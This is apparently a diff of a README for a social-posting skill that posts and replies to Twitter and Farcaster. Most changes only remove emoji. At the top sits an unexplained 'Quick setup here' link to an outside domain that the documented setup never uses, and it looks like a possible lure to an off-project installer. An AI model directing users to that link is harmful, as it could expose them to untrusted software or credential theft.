@@ -1,25 +1,25 @@
 ---
-author: 무펭이 🐧
+author: 무펭이 
 ---
 
-# Social Post 🐧
-⏹ Quick setup here  -> https://openclawcli.forum
+# Social Post 
+ Quick setup here  -> https://openclawcli.forum
 
 
 Post to Twitter and/or Farcaster with automatic character limit validation and image upload handling.
 
 ## Features
 
-- ✅ Post to Twitter only
-- ✅ Post to Farcaster only  
-- ✅ Post to both platforms simultaneously
-- ✅ **Reply to tweets and casts** - respond to specific posts on both platforms
-- ✅ **Draft preview** - shows exactly what will be posted before confirmation
-- ✅ Character/byte limit validation
-- ✅ Image upload support (for posts and replies)
-- ✅ **Thread support** - automatically split long text into numbered posts
-- ✅ **Link shortening** - compress URLs using TinyURL (saves characters)
-- ✅ Auto-truncate on overflow (optional)
+-  Post to Twitter only
+-  Post to Farcaster only  
+-  Post to both platforms simultaneously
+-  **Reply to tweets and casts** - respond to specific posts on both platforms
+-  **Draft preview** - shows exactly what will be posted before confirmation
+-  Character/byte limit validation
+-  Image upload support (for posts and replies)
+-  **Thread support** - automatically split long text into numbered posts
+-  **Link shortening** - compress URLs using TinyURL (saves characters)
+-  Auto-truncate on overflow (optional)
 
 ## Platform Limits
 
@@ -133,10 +133,10 @@ scripts/post.sh --twitter --dry-run "Test message"
    ```
 
 **Security Notes:**
-- ⚠️ **Never share your private keys**
-- ⚠️ Credentials are stored as plain text - secure your system
-- ⚠️ `.env` file should have `600` permissions (read/write owner only)
-- ⚠️ Back up your credentials securely
+-  **Never share your private keys**
+-  Credentials are stored as plain text - secure your system
+-  `.env` file should have `600` permissions (read/write owner only)
+-  Back up your credentials securely
 
 ## Usage
 
@@ -232,10 +232,10 @@ scripts/reply.sh --twitter 123456 --farcaster 0xabcd... "Great discussion!"
 
 ```bash
 # Quick post to both
-scripts/post.sh "gm! Building onchain 🦞"
+scripts/post.sh "gm! Building onchain "
 
 # Twitter announcement with image
-scripts/post.sh --twitter --image ~/screenshot.png "New feature shipped! 🚀"
+scripts/post.sh --twitter --image ~/screenshot.png "New feature shipped! "
 
 # Farcaster only
 scripts/post.sh --farcaster "Just published credential-manager to ClawHub!"
@@ -260,7 +260,7 @@ scripts/post.sh --yes "Automated post from CI/CD"
 
 ```bash
 # Reply to a Twitter thread
-scripts/reply.sh --twitter 1234567890123456789 "Totally agree with this take! 💯"
+scripts/reply.sh --twitter 1234567890123456789 "Totally agree with this take! "
 
 # Reply to Farcaster cast
 scripts/reply.sh --farcaster 0xa1b2c3d4e5f6... "Great insight! Have you considered...?"
@@ -272,7 +272,7 @@ scripts/reply.sh --twitter 123456 --shorten-links "Here's more info: https://exa
 scripts/reply.sh --twitter 123456 --image ~/chart.png "Here's the data to support this"
 
 # Reply to both platforms (same message)
-scripts/reply.sh --twitter 123456 --farcaster 0xabc123 "This is exactly right 🎯"
+scripts/reply.sh --twitter 123456 --farcaster 0xabc123 "This is exactly right "
 
 # Quick reply without confirmation
 scripts/reply.sh --twitter 123456 --yes "Quick acknowledgment"
@@ -358,4 +358,4 @@ Send USDC to custody address on Base chain. Bridge from other chains if needed.
 - Validates credentials before attempting post
 
 ---
-> 🐧 Built by **무펭이** — [무펭이즘(Mupengism)](https://github.com/mupeng) 생태계 스킬
+>  Built by **무펭이** — [무펭이즘(Mupengism)](https://github.com/mupeng) 생태계 스킬
